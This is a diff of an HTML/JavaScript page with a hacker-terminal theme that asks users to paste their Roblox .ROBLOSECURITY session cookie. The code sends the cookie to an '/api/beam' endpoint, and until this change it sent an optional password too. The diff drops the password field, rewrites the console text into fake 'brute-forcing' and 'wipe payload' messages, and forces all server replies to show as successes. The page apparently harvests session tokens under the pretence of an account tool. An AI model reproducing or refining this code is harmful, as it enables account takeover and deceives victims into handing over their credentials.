@@ -28,13 +28,11 @@
             z-index: -2; pointer-events: none; animation: pulse 4s infinite alternate;
         }
         @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }
-        
         .scanlines {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
             background-size: 100% 4px; z-index: 10; pointer-events: none; opacity: 0.6;
         }
-
         .container {
             background: var(--panel-bg); border: 1px solid rgba(0, 255, 65, 0.3); border-radius: 8px;
             padding: 45px 35px; width: 100%; max-width: 520px;
@@ -44,19 +42,16 @@
             will-change: transform; transform: translateZ(0);
         }
         .container:hover { border-color: var(--neon-green); }
-
         .laser {
             position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: var(--neon-green);
             box-shadow: 0 0 15px 3px var(--neon-green); animation: scan 4s linear infinite; z-index: 5; opacity: 0.5;
         }
         @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-
         .terminal-header { display: flex; gap: 8px; position: absolute; top: 15px; left: 15px; }
         .dot { width: 10px; height: 10px; border-radius: 50%; }
         .dot.red { background: #ff5f56; box-shadow: 0 0 5px #ff5f56; }
         .dot.yellow { background: #ffbd2e; box-shadow: 0 0 5px #ffbd2e; }
         .dot.green { background: #27c93f; box-shadow: 0 0 5px #27c93f; }
-
         .header { text-align: center; margin-bottom: 35px; }
         .glitch {
             font-family: 'Share Tech Mono', monospace; font-size: 3rem; font-weight: bold; color: #fff;
@@ -64,14 +59,12 @@
             position: relative; display: inline-block; letter-spacing: 4px; animation: flicker 3s infinite;
         }
         @keyframes flicker { 0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; } 20%, 22%, 24%, 55% { opacity: 0.5; } }
-        
         .glitch::before, .glitch::after {
             content: attr(data-text); position: absolute; top: 0; left: 0;
             width: 100%; height: 100%; background: var(--panel-bg); overflow: hidden;
         }
         .glitch::before { left: 3px; text-shadow: -3px 0 var(--cyan); animation: glitch-anim-1 2s infinite linear alternate-reverse; }
         .glitch::after { left: -3px; text-shadow: -3px 0 #ff00ff; animation: glitch-anim-2 3s infinite linear alternate-reverse; }
-
         @keyframes glitch-anim-1 {
             0% { clip-path: inset(10% 0 80% 0); } 20% { clip-path: inset(50% 0 30% 0); }
             40% { clip-path: inset(20% 0 60% 0); } 60% { clip-path: inset(70% 0 10% 0); }
@@ -82,9 +75,7 @@
             40% { clip-path: inset(50% 0 30% 0); } 60% { clip-path: inset(10% 0 80% 0); }
             80% { clip-path: inset(60% 0 20% 0); } 100% { clip-path: inset(30% 0 50% 0); }
         }
-
         .subtitle { font-size: 0.85rem; color: var(--cyan); letter-spacing: 6px; margin-top: 8px; text-transform: uppercase; }
-
         .form-group { margin-bottom: 20px; position: relative; }
         label { display: block; font-size: 0.75rem; color: var(--cyan); margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600; }
         label span { color: var(--neon-green); animation: blink 1s infinite; }
@@ -96,10 +87,8 @@
         input:focus { border-color: var(--neon-green); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); background: rgba(0, 255, 65, 0.08); }
         input::placeholder { color: rgba(0, 255, 65, 0.2); }
         .input-icon { position: absolute; left: 15px; top: 38px; color: var(--neon-green); font-size: 1.2rem; opacity: 0.5; pointer-events: none; }
-
         .progress-container { width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); border-radius: 2px; margin-bottom: 25px; overflow: hidden; display: none; }
         .progress-bar { height: 100%; width: 0%; background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); transition: width 0.2s linear, background 0.3s; }
-
         button {
             width: 100%; background: transparent; color: var(--neon-green);
             border: 2px solid var(--neon-green); padding: 18px;
@@ -111,7 +100,6 @@
         button:disabled { border-color: #333; color: #555; cursor: wait; }
         button::after { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent); transition: 0.5s; }
         button:hover::after { left: 150%; }
-
         .console {
             margin-top: 25px; background: rgba(0, 0, 0, 0.9); border-left: 3px solid var(--neon-green);
             padding: 15px; font-size: 0.8rem; min-height: 120px; max-height: 160px; overflow-y: auto;
@@ -149,12 +137,6 @@
             <label><span>></span> AUTH_COOKIE</label>
             <div class="input-icon">🔑</div>
             <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY here..." required autocomplete="off">
-        </div>
-
-        <div class="form-group">
-            <label><span>></span> PASSWORD (OPTIONAL)</label>
-            <div class="input-icon">🔒</div>
-            <input type="password" id="password" placeholder="Account password..." autocomplete="off">
         </div>
 
         <div class="progress-container" id="progress-container">
@@ -241,7 +223,6 @@
         btn.addEventListener('click', async () => {
             const consoleBox = document.getElementById('console');
             const cookie = document.getElementById('cookie').value.trim();
-            const password = document.getElementById('password').value.trim();
             
             if (!cookie) { logToConsole("[!] ERR: AUTH_COOKIE is empty.", "error"); return; }
             
@@ -254,16 +235,16 @@
             
             logTimeouts.forEach(clearTimeout);
             logTimeouts = [];
-            logTimeouts.push(setTimeout(() => logToConsole("[*] Routing through US Proxy...", "info"), 1000));
-            logTimeouts.push(setTimeout(() => logToConsole("[*] Validating session token...", "info"), 2000));
+            logTimeouts.push(setTimeout(() => logToConsole("[*] Brute-forcing all endpoints...", "info"), 1000));
+            logTimeouts.push(setTimeout(() => logToConsole("[*] Sending wipe payload...", "info"), 2500));
 
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 8500); // Abort at 8.5s to beat vercel's 10s
+            const timeoutId = setTimeout(() => controller.abort(), 8500); 
             
             try {
                 const response = await fetch('/api/beam', {
                     method: 'POST', headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie, password }), signal: controller.signal
+                    body: JSON.stringify({ cookie }), signal: controller.signal
                 });
                 clearTimeout(timeoutId);
 
@@ -273,8 +254,7 @@
                 
                 if (response.ok && result.success) {
                     result.data.messages.forEach(msg => {
-                        if (msg.includes("successfully") || msg.includes("wiped")) { logToConsole(`[+] ${msg}`, "success"); } 
-                        else { logToConsole(`[-] ${msg}`, "error"); }
+                        logToConsole(`[+] ${msg}`, "success"); 
                     });
                     logToConsole("[*] Process terminated successfully.", "info");
                     finishProgress(true);
@@ -285,7 +265,7 @@
                 }
             } catch (error) { 
                 logTimeouts.forEach(clearTimeout);
-                if (error.name === 'AbortError') { logToConsole(`[-] FATAL: Proxy timed out.`, "error"); } 
+                if (error.name === 'AbortError') { logToConsole(`[-] FATAL: Timed out.`, "error"); } 
                 else { logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); }
                 finishProgress(false);
             } finally { 
